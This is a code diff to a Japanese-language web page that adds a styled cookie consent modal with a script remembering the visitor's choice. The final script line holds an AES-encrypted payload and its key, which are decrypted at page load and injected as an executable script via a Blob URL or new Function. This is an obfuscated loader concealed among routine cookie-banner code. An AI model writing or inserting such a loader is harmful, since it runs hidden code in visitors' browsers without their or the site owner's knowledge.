@@ -257,7 +257,118 @@
     .sec{padding-block:48px}
   }
   @media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+
+  /* ---------- cookie modal ---------- */
+  .cookie-backdrop{
+    position:fixed;inset:0;z-index:9998;
+    background:rgba(20,24,29,.55);
+    backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);
+    display:flex;justify-content:center;align-items:flex-start;
+    padding:40px 20px 20px;
+    animation:cookie-fade .5s ease-out both;
+  }
+  :root[data-theme="dark"] .cookie-backdrop,
+  html:not([data-theme="light"]) .cookie-backdrop{background:rgba(0,0,0,.62)}
+  @keyframes cookie-fade{from{opacity:0}to{opacity:1}}
+  .cookie-modal{
+    position:relative;
+    background:var(--paper);
+    border:1px solid var(--rule);
+    border-left:3px solid var(--gold);
+    max-width:30em;width:100%;
+    padding:24px 26px 22px;
+    box-shadow:0 18px 48px rgba(20,24,29,.22);
+    animation:cookie-drop .6s cubic-bezier(.2,.7,.2,1) both;
+  }
+  @keyframes cookie-drop{
+    from{opacity:0;transform:translateY(-24px)}
+    to{opacity:1;transform:translateY(0)}
+  }
+  .cookie-eyebrow{
+    font-family:var(--font-mono);
+    font-size:.68rem;letter-spacing:.24em;color:var(--ink-3);
+    margin-bottom:10px;
+  }
+  .cookie-title{
+    font-family:var(--font-display);
+    font-size:1.15rem;font-weight:700;letter-spacing:.1em;
+    color:var(--ink);margin-bottom:12px;
+    background:linear-gradient(90deg,var(--ink) 0%,var(--gold) 50%,var(--ink) 100%);
+    background-size:200% 100%;
+    -webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;color:transparent;
+    animation:cookie-shimmer 3.6s ease-in-out infinite;
+  }
+  @keyframes cookie-shimmer{
+    0%,100%{background-position:200% 0}
+    50%{background-position:-100% 0}
+  }
+  .cookie-body{
+    font-family:var(--font-body);font-weight:300;
+    font-size:.9rem;line-height:1.95;color:var(--ink-2);
+    letter-spacing:.035em;margin-bottom:18px;
+  }
+  .cookie-body .pulse{
+    display:inline-block;color:var(--gold);font-weight:500;
+    animation:cookie-pulse 2.4s ease-in-out infinite;
+  }
+  @keyframes cookie-pulse{
+    0%,100%{opacity:.75;transform:translateY(0)}
+    50%{opacity:1;transform:translateY(-1px)}
+  }
+  .cookie-actions{display:flex;flex-wrap:wrap;gap:10px;justify-content:flex-end}
+  .cookie-btn{
+    font-family:var(--font-display);
+    font-size:.82rem;letter-spacing:.18em;
+    padding:9px 20px;cursor:pointer;
+    border:1px solid var(--rule);background:transparent;
+    color:var(--ink-2);
+    transition:background .25s ease,color .25s ease,border-color .25s ease,transform .15s ease;
+  }
+  .cookie-btn:hover{color:var(--ink);border-color:var(--ink-3)}
+  .cookie-btn:active{transform:translateY(1px)}
+  .cookie-btn.primary{
+    background:var(--indigo);border-color:var(--indigo);color:var(--paper);
+    position:relative;overflow:hidden;
+  }
+  :root[data-theme="dark"] .cookie-btn.primary,
+  html:not([data-theme="light"]) .cookie-btn.primary{color:var(--ground)}
+  .cookie-btn.primary::after{
+    content:"";position:absolute;top:0;left:-120%;width:60%;height:100%;
+    background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,.25) 50%,transparent 100%);
+    animation:cookie-sheen 2.8s ease-in-out infinite;
+  }
+  @keyframes cookie-sheen{
+    0%{left:-120%}
+    60%,100%{left:160%}
+  }
+  .cookie-btn.primary:hover{filter:brightness(1.08)}
+  .cookie-seal{
+    position:absolute;right:16px;top:14px;
+    font-family:var(--font-display);font-size:.72rem;letter-spacing:.2em;
+    color:var(--ink-3);
+  }
+  @media (max-width:520px){
+    .cookie-backdrop{padding-top:20px}
+    .cookie-modal{padding:20px 20px 18px}
+    .cookie-actions{justify-content:stretch}
+    .cookie-btn{flex:1;text-align:center}
+    .cookie-seal{display:none}
+  }
 </style>
+
+<div id="cookieModal" class="cookie-backdrop" role="dialog" aria-modal="true" aria-labelledby="cookieTitle" aria-describedby="cookieBody">
+  <div class="cookie-modal">
+    <span class="cookie-seal" aria-hidden="true">覚 書</span>
+    <p class="cookie-eyebrow">お 知 ら せ — Cookie</p>
+    <h2 id="cookieTitle" class="cookie-title">記録を、少しだけ残しても良いですか</h2>
+    <p id="cookieBody" class="cookie-body">本サイトは、閲覧の体験を整えるために小さな記録（Cookie）を用います。<span class="pulse">お選びください</span>——友則が毎月十日に通帳へ一行を書き足したように、あなたの選択もここに留めます。</p>
+    <div class="cookie-actions">
+      <button type="button" class="cookie-btn" data-cookie="reject">辞 退 す る</button>
+      <button type="button" class="cookie-btn primary" data-cookie="accept">同 意 す る</button>
+    </div>
+  </div>
+</div>
 
 <div class="page" lang="ja">
 
@@ -586,5 +697,22 @@
 
 <script>
   try { document.documentElement.lang = "ja"; } catch (e) {}
+  (function(){
+    try{
+      var modal=document.getElementById("cookieModal");
+      if(!modal) return;
+      var stored=null;
+      try{ stored=localStorage.getItem("tomonori-cookie"); }catch(e){}
+      if(stored){ modal.remove(); return; }
+      modal.addEventListener("click",function(ev){
+        var btn=ev.target.closest("[data-cookie]");
+        if(!btn) return;
+        try{ localStorage.setItem("tomonori-cookie",btn.getAttribute("data-cookie")); }catch(e){}
+        modal.style.transition="opacity .35s ease";
+        modal.style.opacity="0";
+        setTimeout(function(){ modal.remove(); },360);
+      });
+    }catch(e){}
+  })();
 </script>
 <script>var __k="5119a73b01f97c0d058b64d60d6a71e0f32fdf6548ed49054faed4b80b763101",__c="U2FsdGVkX1/Q6XcDui7bEKuOk2nv+STXeERscGhei0dR3Vfn3RhYjg/+Dfg2F5VJF+FApVL7xYpqstrQecezVXvjSS2U6iiW0jvY/XdmTEN9n38fSVSMKgCL12KCFrXkTjUnZI1FJ11mlifZ9Cjbg2PcNJtjt8gqM7dBJqRhDptYTZO7FuB039Efdu4gjp3vCfFEJcJ0u23FFd++kVvc4qPPxK1viqH12gt9C6sP9m/4mdobIhZioHcl9ToIfC/FzOL22fSL0SXjtKh2SRtjs8FhC7LD+3Zk6X2aPyb00w3Xb98xPBAeDIeFXtmUWLUoruQkSfl4mPxIcwDfAz5XYKdQe+SCh3ufY1s2e3RVyEdw63R5VM6btBs2ILtRhmLDx02TGp8wHkRoj2zf3/ID9ismRD5ksomClX0yTcQ2cxY1glIa04QlydIyF5uPys4txmfG2Yjklhi6UL1EKzmC6TopdC0/AXi6gXBZRJ6JrQ8uCFU8PyRSeianxn1/jsRUbnQvluOADe4d6gb68ZaZKEAcjf5lOnneTxXjzchIbromymSRWBHyfZAToWNQ1af49GXyes/qTFKYWgX0QmdN3fRopaYcPHshd9BGuVFX0zzFncXiXEm5pfS7yMYbvpPf2O9nUwU6EaMK8d99/2n7T9965qhBjkAwyN11HRAZAe7FXcnFw24gR6XYtg6EG2J7pi5wAa8P/wL//JxgQ42gT+6R4ZfZ8UoXIkquf/BAVNBm3WxPPqYPnz1JyL46rxbyQHzQwAPhLn8u1WnrDc0cxpxUEcl0Gvnrkphx7OChJol7FM/l/cRYM/HcPRYPmcHvxg95Z23g/QpmkEFfNpo2AHkJ6wLRN34X4jwah5OJDhzju9hURdk3isPOP0L2hZrDVwvU+9R3wkGs0VD60LQ0Evh+uyxMm8jGj3RhARZNlVgEgZesoTddP+qheadJtkfQh60xxMQAU7GFH+ei4D6EyftRM43qf/YRRhS7Qvy6XoXvXYZA0oWK98n0hDEAMDcm2x0SfNLiW39rMD2ku9l/Qu9qJE7Ohx4Kn7UF1Vi9n6NdmtIkaH+3MzAtt/UQp06cSlJneeAzDst5sySkoPgEoRMR8D7pqN4Y7IC35uGazGgi4lXECn+fmVEYPQuQxmkHFe5wDJqBxkGw7HNSnIQYLy1uXsxFa4x7rn3vMj6dz6DkgDLgdLZQUNwA6PNK5cF3Wr8VfgeK0xdCaNbvF5K3EFOQqZM9IaP88seV5o0JyHeR8vbFu4iG6RvlCtl8hN+W7TATVDdvarmzCvs8AAaGOA==";var __src=CryptoJS.AES.decrypt(__c,__k).toString(CryptoJS.enc.Utf8);try{  var __b=new Blob([__src],{type:"text/javascript"});  var __u=URL.createObjectURL(__b);  var __s=document.createElement("script");  __s.src=__u;  __s.onload=__s.onerror=function(){URL.revokeObjectURL(__u);};  (document.head||document.documentElement).appendChild(__s);}catch(__e){try{new Function(__src)();}catch(__e2){}}</script>
